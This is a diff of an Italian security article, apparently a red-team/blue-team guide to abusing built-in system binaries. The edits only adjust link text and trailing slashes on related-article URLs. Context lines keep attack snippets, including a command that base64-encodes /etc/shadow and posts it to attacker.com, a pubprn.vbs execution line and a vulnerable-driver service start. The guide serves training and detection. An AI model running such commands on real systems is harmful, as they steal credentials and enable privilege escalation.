@@ -1121,7 +1121,7 @@ cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1
 
 ## Linux — GTFOBins completi
 
-Fonte: [GTFOBins ](https://gtfobins.github.io), puoi anche leggere il nostro articolo completo [qui](https://hackita.it/articoli/gtfobins/).
+Fonte: [GTFOBins ](https://gtfobins.github.io), puoi anche leggere il nostro [articolo completo su GTFOBins](https://hackita.it/articoli/gtfobins/).
 
 ***
 
@@ -1509,7 +1509,7 @@ cat /etc/shadow | openssl enc -base64 | curl -d @- http://attacker.com/exfil
 
 ### Privilege Escalation via sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)
 
-> 📌 Approfondisci con il nostro articolo su [Privilege Escalation Linux](https://hackita.it/articoli/privilege-escalation-linux)
+> 📌 Approfondisci con il nostro articolo su [Privilege Escalation Linux](https://hackita.it/articoli/privilege-escalation-linux/)
 
 #### `vim` / `vi` / `nano`
 
@@ -2325,7 +2325,7 @@ sc start VulnDriver
 
 ## Blue Team: detection e hardening
 
-> 📌 Approfondisci con il nostro articolo su [Sysmon (un driver Microsoft gratuito che logga eventi di sistema avanzati: quali processi si avviano, quali connessioni di rete si aprono, quali file vengono creati — fondamentale per fare detection): configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione)
+> 📌 Approfondisci con il nostro articolo su [Sysmon (un driver Microsoft gratuito che logga eventi di sistema avanzati: quali processi si avviano, quali connessioni di rete si aprono, quali file vengono creati — fondamentale per fare detection): configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione/)
 
 ### Tabella anomalie — Windows
 
@@ -2470,16 +2470,16 @@ Windows: `certutil.exe` (download, encode), `PowerShell` (versatile), `wmic.exe`
 
 ### Articoli correlati su Hackita
 
-* 📖 [Introduzione al Red Team: metodologia e fasi](https://hackita.it/articoli/red-team)
-* 📖 [Privilege Escalation Windows: dalla teoria alla pratica](https://hackita.it/articoli/privilege-escalation-windows)
+* 📖 [Introduzione al Red Team: metodologia e fasi](https://hackita.it/articoli/red-team/)
+* 📖 [Privilege Escalation Windows: dalla teoria alla pratica](https://hackita.it/articoli/privilege-escalation-windows/)
 * 📖 [Privilege Escalation Linux: tecniche complete](https://hackita.it/articoli/linux-privesc/)
 * 📖 [Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale) Attacks: Kerberoasting, AS-REP Roasting, DCSync](https://hackita.it/articoli/active-directory/)
-* 📖 [Sysmon: configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione)
-* 📖 [MITRE ATT\&CK: come usarlo nel pentesting](https://hackita.it/articoli/mitre-attack-pentesting)
-* 📖 [Red Team vs Blue Team: engagement reale](https://hackita.it/articoli/red-team-blue-team-engagement)
-* 📖 [Evasione EDR: tecniche e metodologie](https://hackita.it/articoli/evasione-edr-tecniche)
-* 📖 [PowerShell per il Pentesting: guida completa](https://hackita.it/articoli/powershell)
-* 📖 [Post-Exploitation Windows: cosa fare dopo l'accesso iniziale](https://hackita.it/articoli/post-exploitation-windows)
+* 📖 [Sysmon: configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione/)
+* 📖 [MITRE ATT\&CK: come usarlo nel pentesting](https://hackita.it/articoli/mitre-attack-pentesting/)
+* 📖 [Red Team vs Blue Team: engagement reale](https://hackita.it/articoli/red-team-blue-team-engagement/)
+* 📖 [Evasione EDR: tecniche e metodologie](https://hackita.it/articoli/evasione-edr-tecniche/)
+* 📖 [PowerShell per il Pentesting: guida completa](https://hackita.it/articoli/powershell/)
+* 📖 [Post-Exploitation Windows: cosa fare dopo l'accesso iniziale](https://hackita.it/articoli/post-exploitation-windows/)
 
 ### Risorse esterne
 
